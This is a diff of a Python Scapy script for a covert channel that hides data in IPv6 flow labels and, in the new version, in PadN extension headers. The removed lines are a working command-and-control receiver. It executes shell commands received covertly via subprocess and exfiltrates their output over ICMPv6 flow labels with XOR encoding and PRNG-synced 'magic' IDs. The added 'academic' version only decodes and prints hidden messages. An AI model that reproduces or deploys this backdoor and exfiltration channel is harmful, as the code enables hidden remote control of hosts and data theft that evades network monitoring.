@@ -1,97 +1,69 @@
 from scapy.all import *
-import subprocess # For executing received commands
 import sys
 import random
-import time
 
-# Configuration
-INTERFACE = "lo0"       
-SEED_VAL = 1114         
-ENCRYPTION_KEY = 0x55   
-TRIGGER_EXEC = ";"      
-TRIGGER_EXFIL = "!"     
-TARGET_IP = "::1"       
-SYNC_ID = 4095          
+# --- V7 ACADEMIC CONFIGURATION ---
+INTERFACE = "lo0"          # Use lo if using Linux
+ENCRYPTION_KEY = 0x55      
+TARGET_IP = "::1"          
+SEED_VAL = 1114
+SYNC_ID = 0xFFFFF          # Maximum 20-bit Flow Label value used as a Burst-Sync trigger
 
 random.seed(SEED_VAL)
 cmd_buffer = ""
 
-def send_exfiltration(output_str):
-    print(f"\n[*] Exfiltrating {len(output_str)} bytes of data...")
-    time.sleep(1.0) # Wait for the Sender to initialize its listener
-    
-    #Send  3 times to ensure delivery
-    for _ in range(3):
-        sync_pkt = IPv6(dst=TARGET_IP, fl=(SYNC_ID << 8) | 0) / ICMPv6EchoRequest()
-        send(sync_pkt, verbose=False)
-        time.sleep(0.02)
-    
-    # reset local PRNG state to ensure Sender and Receiver are in sync for the upcoming encrypted transmission
-    random.seed(SEED_VAL)
-    
-    full_msg = output_str + "\x00" 
-    
-    for char in full_msg:
-        magic_id = random.randint(0, 4094)
-        encrypted_char = ord(char) ^ ENCRYPTION_KEY
-        
-        flow_label_val = (magic_id << 8) | encrypted_char
-        pkt = IPv6(dst=TARGET_IP, fl=flow_label_val) / ICMPv6EchoRequest()
-        
-        send(pkt, verbose=False)
-        time.sleep(0.005)
-        
-    print("[+] Exfiltration complete. Returning to stealth mode.")
-
 def process_packet(pkt):
     global cmd_buffer
     
-    if not pkt.haslayer(ICMPv6EchoRequest): 
-        return
+    # 1. Broad filter: Catch IPv6 packets carrying TCP to port 443
+    if pkt.haslayer(IPv6) and pkt.haslayer(TCP) and pkt[TCP].dport == 443:
         
-    if pkt.haslayer(IPv6):
         flow_label = pkt[IPv6].fl
-        received_magic = flow_label >> 8
-
-        # catch burst of SYNC packets to initialize PRNG state and reset command buffer
-        if received_magic == SYNC_ID:
+        
+        # 2. Catch the Burst-Sync signal to reset the PRNG
+        if flow_label == SYNC_ID:
             random.seed(SEED_VAL)
             cmd_buffer = ""
             return
-
-        # Validate Magic Number matches expected PRNG output
+            
+        # 3. Cryptographic Authenticator: Check if Flow Label matches our PRNG sequence
         prng_state = random.getstate()
-        expected_magic = random.randint(0, 4094)
-
-        if received_magic == expected_magic:
-            encrypted_char = flow_label & 0xFF 
-            decrypted_char = chr(encrypted_char ^ ENCRYPTION_KEY)
-
-            if decrypted_char == TRIGGER_EXEC:
-                print(f"\n[+] Silent execution: {cmd_buffer}")
-                subprocess.Popen(cmd_buffer, shell=True) 
-                cmd_buffer = ""
-                
-            elif decrypted_char == TRIGGER_EXFIL:
-                print(f"\n[+] Executing and capturing output: {cmd_buffer}")
-                try:
-                    # Enforce a 10-second limit to prevent the script from hanging indefinitely
-                    result = subprocess.run(cmd_buffer, shell=True, capture_output=True, text=True, timeout=10)
-                    output = result.stdout if result.returncode == 0 else result.stderr
-                except subprocess.TimeoutExpired:
-                    output = "[!] Error: Command execution timed out after 10 seconds."
-                
-                if not output: output = "Command executed successfully (no output).\n"
-                send_exfiltration(output)
-                cmd_buffer = ""
-            else:
-                cmd_buffer += decrypted_char
-                sys.stdout.write(decrypted_char)
-                sys.stdout.flush()
+        expected_magic = random.randint(0, 0xFFFFE) # Reserve FFFFF for SYNC
+        
+        if flow_label == expected_magic:
+            # 4. If authenticated, inspect the Extension Header for the payload
+            if pkt.haslayer(IPv6ExtHdrDestOpt):
+                for opt in pkt[IPv6ExtHdrDestOpt].options:
+                    if isinstance(opt, PadN):
+                        covert_data = opt.optdata
+                        
+                        if covert_data:
+                            # 5. Extract and Decrypt the distributed payload
+                            encrypted_byte = covert_data[0] if isinstance(covert_data, bytes) else covert_data
+                            if type(encrypted_byte) is str:
+                                encrypted_byte = ord(encrypted_byte)
+                                
+                            decrypted_char = chr(encrypted_byte ^ ENCRYPTION_KEY)
+                            
+                            if decrypted_char == ";":
+                                # End of transmission signal
+                                print(f"\n[+] Transmission received successfully: {cmd_buffer}")
+                                cmd_buffer = ""
+                            else:
+                                cmd_buffer += decrypted_char
+                                sys.stdout.write(decrypted_char)
+                                sys.stdout.flush()
+                                
+                            break # Ignore Scapy's automatic 8-byte alignment padding
         else:
-            # Drop invalid packet, rollback PRNG state
+            # Not our packet, rollback the PRNG state to prevent desynchronization
             random.setstate(prng_state)
 
 if __name__ == "__main__":
-    print(f"[*] C2 Receiver active on {INTERFACE}")
-    sniff(filter="icmp6", prn=process_packet, store=0, iface=INTERFACE)
+    print("==================================================")
+    print(" Academic Receiver: Distributed Steganography  ")
+    print(" Tracking Flow Labels & PadN Extension Headers    ")
+    print("==================================================")
+    print(f"[*] Active on {INTERFACE} - Sniffing for stealth TCP SYN traffic...\n")
+    
+    sniff(filter="ip6", prn=process_packet, store=0, iface=INTERFACE)
